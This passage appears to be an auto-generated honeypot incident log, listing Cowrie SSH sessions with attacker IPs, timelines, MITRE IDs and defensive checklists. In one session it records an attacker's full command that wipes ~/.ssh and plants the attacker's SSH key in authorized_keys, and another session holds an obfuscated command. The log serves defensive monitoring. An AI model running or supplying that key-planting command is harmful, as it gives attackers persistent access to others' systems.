| **Last Seen** | 2026-08-19 11:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:02:39` | `cowrie.session.connect` |
| `2026-08-19 11:02:39` | `cowrie.client.version` |
| `2026-08-19 11:02:39` | `cowrie.client.kex` |
| `2026-08-19 11:02:42` | `cowrie.login.success` |
| `2026-08-19 11:02:42` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5de603491546

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:06 |
| **Last Seen** | 2026-08-19 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:06:56` | `cowrie.session.connect` |
| `2026-08-19 11:06:56` | `cowrie.client.version` |
| `2026-08-19 11:06:56` | `cowrie.client.kex` |
| `2026-08-19 11:06:56` | `cowrie.login.success` |
| `2026-08-19 11:06:57` | `cowrie.session.params` |
| `2026-08-19 11:06:57` | `cowrie.command.input` |
| `2026-08-19 11:06:57` | `cowrie.log.closed` |
| `2026-08-19 11:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7199a492b01

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:12 |
| **Last Seen** | 2026-08-19 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:12:52` | `cowrie.session.connect` |
| `2026-08-19 11:12:52` | `cowrie.client.version` |
| `2026-08-19 11:12:52` | `cowrie.client.kex` |
| `2026-08-19 11:12:52` | `cowrie.login.success` |
| `2026-08-19 11:12:53` | `cowrie.session.params` |
| `2026-08-19 11:12:53` | `cowrie.command.input` |
| `2026-08-19 11:12:53` | `cowrie.log.closed` |
| `2026-08-19 11:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e14d5394fd

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 11:13 |
| **Last Seen** | 2026-08-19 11:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:13:58` | `cowrie.session.connect` |
| `2026-08-19 11:14:00` | `cowrie.client.version` |
| `2026-08-19 11:14:00` | `cowrie.client.kex` |
| `2026-08-19 11:14:06` | `cowrie.login.success` |
| `2026-08-19 11:14:09` | `cowrie.session.params` |
| `2026-08-19 11:14:09` | `cowrie.command.input` |
| `2026-08-19 11:14:12` | `cowrie.log.closed` |
| `2026-08-19 11:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f07947a4186

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-19 11:17 |
| **Last Seen** | 2026-08-19 11:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:17:16` | `cowrie.session.connect` |
| `2026-08-19 11:17:17` | `cowrie.client.version` |
| `2026-08-19 11:17:17` | `cowrie.client.kex` |
| `2026-08-19 11:17:18` | `cowrie.login.success` |
| `2026-08-19 11:17:19` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e98dc59cb94

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-08-19 11:17 |
| **Last Seen** | 2026-08-19 11:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:17:25` | `cowrie.session.connect` |
| `2026-08-19 11:17:26` | `cowrie.client.version` |
| `2026-08-19 11:17:26` | `cowrie.client.kex` |
| `2026-08-19 11:17:28` | `cowrie.login.success` |
| `2026-08-19 11:17:28` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1d40efe5f2f

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:18 |
| **Last Seen** | 2026-08-19 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:18:48` | `cowrie.session.connect` |
| `2026-08-19 11:18:48` | `cowrie.client.version` |
| `2026-08-19 11:18:48` | `cowrie.client.kex` |
| `2026-08-19 11:18:48` | `cowrie.login.success` |
| `2026-08-19 11:18:49` | `cowrie.session.params` |
| `2026-08-19 11:18:49` | `cowrie.command.input` |
| `2026-08-19 11:18:49` | `cowrie.log.closed` |
| `2026-08-19 11:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10be04999fad

| Field | Detail |
|---|---|
| **Source IP** | `80.91.223[.]114` |
| **First Seen** | 2026-08-19 11:21 |
| **Last Seen** | 2026-08-19 11:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:21:58` | `cowrie.session.connect` |
| `2026-08-19 11:21:58` | `cowrie.client.version` |
| `2026-08-19 11:21:58` | `cowrie.client.kex` |
| `2026-08-19 11:21:58` | `cowrie.login.success` |
| `2026-08-19 11:21:59` | `cowrie.session.params` |
| `2026-08-19 11:21:59` | `cowrie.command.input` |
| `2026-08-19 11:21:59` | `cowrie.command.failed` |
| `2026-08-19 11:22:00` | `cowrie.log.closed` |
| `2026-08-19 11:22:00` | `cowrie.session.params` |
| `2026-08-19 11:22:00` | `cowrie.command.input` |
| `2026-08-19 11:22:00` | `cowrie.session.file_download` |
| `2026-08-19 11:22:00` | `cowrie.log.closed` |
| `2026-08-19 11:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.91.223[.]114` to AbuseIPDB if not already reported
- [ ] Block `80.91.223[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf661402c5a3

| Field | Detail |
|---|---|
| **Source IP** | `80.91.223[.]114` |
| **First Seen** | 2026-08-19 11:22 |
| **Last Seen** | 2026-08-19 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:22:02` | `cowrie.session.connect` |
| `2026-08-19 11:22:02` | `cowrie.client.version` |
| `2026-08-19 11:22:02` | `cowrie.client.kex` |
| `2026-08-19 11:22:02` | `cowrie.login.success` |
| `2026-08-19 11:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.91.223[.]114` to AbuseIPDB if not already reported
- [ ] Block `80.91.223[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51cd88218a6

| Field | Detail |
|---|---|
| **Source IP** | `80.91.223[.]114` |
| **First Seen** | 2026-08-19 11:22 |
| **Last Seen** | 2026-08-19 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:22:02` | `cowrie.session.connect` |
| `2026-08-19 11:22:02` | `cowrie.client.version` |
| `2026-08-19 11:22:02` | `cowrie.client.kex` |
| `2026-08-19 11:22:03` | `cowrie.login.success` |
| `2026-08-19 11:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.91.223[.]114` to AbuseIPDB if not already reported
- [ ] Block `80.91.223[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c89bf43dc90c

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:24 |
| **Last Seen** | 2026-08-19 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:24:44` | `cowrie.session.connect` |
| `2026-08-19 11:24:44` | `cowrie.client.version` |
| `2026-08-19 11:24:44` | `cowrie.client.kex` |
| `2026-08-19 11:24:44` | `cowrie.login.success` |
| `2026-08-19 11:24:45` | `cowrie.session.params` |
| `2026-08-19 11:24:45` | `cowrie.command.input` |
| `2026-08-19 11:24:45` | `cowrie.log.closed` |
| `2026-08-19 11:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ebb0517f82

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 11:26 |
| **Last Seen** | 2026-08-19 11:26 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:26:24` | `cowrie.session.connect` |
| `2026-08-19 11:26:26` | `cowrie.client.version` |
| `2026-08-19 11:26:26` | `cowrie.client.kex` |
| `2026-08-19 11:26:32` | `cowrie.login.success` |
| `2026-08-19 11:26:36` | `cowrie.session.params` |
| `2026-08-19 11:26:36` | `cowrie.command.input` |
| `2026-08-19 11:26:37` | `cowrie.log.closed` |
| `2026-08-19 11:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89fffda62e62

| Field | Detail |
|---|---|
| **Source IP** | `117.222.2[.]101` |
| **First Seen** | 2026-08-19 11:28 |
| **Last Seen** | 2026-08-19 11:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:28:50` | `cowrie.session.connect` |
| `2026-08-19 11:28:50` | `cowrie.client.version` |
| `2026-08-19 11:28:50` | `cowrie.client.kex` |
| `2026-08-19 11:28:52` | `cowrie.login.success` |
| `2026-08-19 11:28:53` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.2[.]101` to AbuseIPDB if not already reported
- [ ] Block `117.222.2[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d8f50b6b88

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-08-19 11:29 |
| **Last Seen** | 2026-08-19 11:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:29:00` | `cowrie.session.connect` |
| `2026-08-19 11:29:01` | `cowrie.client.version` |
| `2026-08-19 11:29:01` | `cowrie.client.kex` |
| `2026-08-19 11:29:03` | `cowrie.login.success` |
| `2026-08-19 11:29:03` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204805a9be56

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:30 |
| **Last Seen** | 2026-08-19 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:30:41` | `cowrie.session.connect` |
| `2026-08-19 11:30:41` | `cowrie.client.version` |
| `2026-08-19 11:30:41` | `cowrie.client.kex` |
| `2026-08-19 11:30:41` | `cowrie.login.success` |
| `2026-08-19 11:30:42` | `cowrie.session.params` |
| `2026-08-19 11:30:42` | `cowrie.command.input` |
| `2026-08-19 11:30:42` | `cowrie.log.closed` |
| `2026-08-19 11:30:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1680fe59a7

| Field | Detail |
|---|---|
| **Source IP** | `101.96.209[.]234` |
| **First Seen** | 2026-08-19 11:34 |
| **Last Seen** | 2026-08-19 11:39 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:34:19` | `cowrie.session.connect` |
| `2026-08-19 11:34:20` | `cowrie.client.version` |
| `2026-08-19 11:34:20` | `cowrie.client.kex` |
| `2026-08-19 11:34:21` | `cowrie.login.success` |
| `2026-08-19 11:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.209[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.96.209[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d760b07e33

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-08-19 11:34 |
| **Last Seen** | 2026-08-19 11:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:34:50` | `cowrie.session.connect` |
| `2026-08-19 11:34:51` | `cowrie.client.version` |
| `2026-08-19 11:34:51` | `cowrie.client.kex` |
| `2026-08-19 11:34:53` | `cowrie.login.success` |
| `2026-08-19 11:34:53` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6680da36fb8

| Field | Detail |
|---|---|
| **Source IP** | `182.76.71[.]82` |
| **First Seen** | 2026-08-19 11:34 |
| **Last Seen** | 2026-08-19 11:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:34:59` | `cowrie.session.connect` |
| `2026-08-19 11:35:00` | `cowrie.client.version` |
| `2026-08-19 11:35:00` | `cowrie.client.kex` |
| `2026-08-19 11:35:03` | `cowrie.login.success` |
| `2026-08-19 11:35:04` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.71[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.76.71[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf33afff2dc5

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]51` |
| **First Seen** | 2026-08-19 11:35 |
| **Last Seen** | 2026-08-19 11:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:35:48` | `cowrie.session.connect` |
| `2026-08-19 11:35:49` | `cowrie.client.version` |
| `2026-08-19 11:35:49` | `cowrie.client.kex` |
| `2026-08-19 11:35:51` | `cowrie.login.success` |
| `2026-08-19 11:35:51` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]51` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec794fc8c98

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-19 11:35 |
| **Last Seen** | 2026-08-19 11:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:35:56` | `cowrie.session.connect` |
| `2026-08-19 11:35:57` | `cowrie.client.version` |
| `2026-08-19 11:35:57` | `cowrie.client.kex` |
| `2026-08-19 11:35:58` | `cowrie.login.success` |
| `2026-08-19 11:35:58` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05fa426efdc

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-19 11:36 |
| **Last Seen** | 2026-08-19 11:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:36:05` | `cowrie.session.connect` |
| `2026-08-19 11:36:06` | `cowrie.client.version` |
| `2026-08-19 11:36:06` | `cowrie.client.kex` |
| `2026-08-19 11:36:07` | `cowrie.login.success` |
| `2026-08-19 11:36:07` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4dfaed3177

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-08-19 11:36 |
| **Last Seen** | 2026-08-19 11:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:36:17` | `cowrie.session.connect` |
| `2026-08-19 11:36:17` | `cowrie.client.version` |
| `2026-08-19 11:36:17` | `cowrie.client.kex` |
| `2026-08-19 11:36:20` | `cowrie.login.success` |
| `2026-08-19 11:36:20` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3316ef72250

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:36 |
| **Last Seen** | 2026-08-19 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:36:37` | `cowrie.session.connect` |
| `2026-08-19 11:36:37` | `cowrie.client.version` |
| `2026-08-19 11:36:37` | `cowrie.client.kex` |
| `2026-08-19 11:36:38` | `cowrie.login.success` |
| `2026-08-19 11:36:38` | `cowrie.session.params` |
| `2026-08-19 11:36:38` | `cowrie.command.input` |
| `2026-08-19 11:36:38` | `cowrie.log.closed` |
| `2026-08-19 11:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9062d4756c14

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:37 |
| **Last Seen** | 2026-08-19 11:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:37:11` | `cowrie.session.connect` |
| `2026-08-19 11:37:12` | `cowrie.login.success` |
| `2026-08-19 11:37:13` | `cowrie.session.params` |
| `2026-08-19 11:37:13` | `cowrie.command.input` |
| `2026-08-19 11:37:13` | `cowrie.command.failed` |
| `2026-08-19 11:37:13` | `cowrie.command.input` |
| `2026-08-19 11:37:13` | `cowrie.command.failed` |
| `2026-08-19 11:37:13` | `cowrie.command.input` |
| `2026-08-19 11:37:13` | `cowrie.command.failed` |
| `2026-08-19 11:37:14` | `cowrie.command.input` |
| `2026-08-19 11:37:14` | `cowrie.command.failed` |
| `2026-08-19 11:37:14` | `cowrie.command.input` |
| `2026-08-19 11:37:14` | `cowrie.command.input` |
| `2026-08-19 11:37:14` | `cowrie.command.failed` |
| `2026-08-19 11:37:14` | `cowrie.command.failed` |
| `2026-08-19 11:37:45` | `cowrie.log.closed` |
| `2026-08-19 11:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e461a7ba2eba

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:37 |
| **Last Seen** | 2026-08-19 11:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:37:45` | `cowrie.session.connect` |
| `2026-08-19 11:37:46` | `cowrie.login.success` |
| `2026-08-19 11:37:46` | `cowrie.session.params` |
| `2026-08-19 11:37:47` | `cowrie.command.input` |
| `2026-08-19 11:37:47` | `cowrie.command.failed` |
| `2026-08-19 11:37:47` | `cowrie.command.input` |
| `2026-08-19 11:37:47` | `cowrie.command.failed` |
| `2026-08-19 11:37:47` | `cowrie.command.input` |
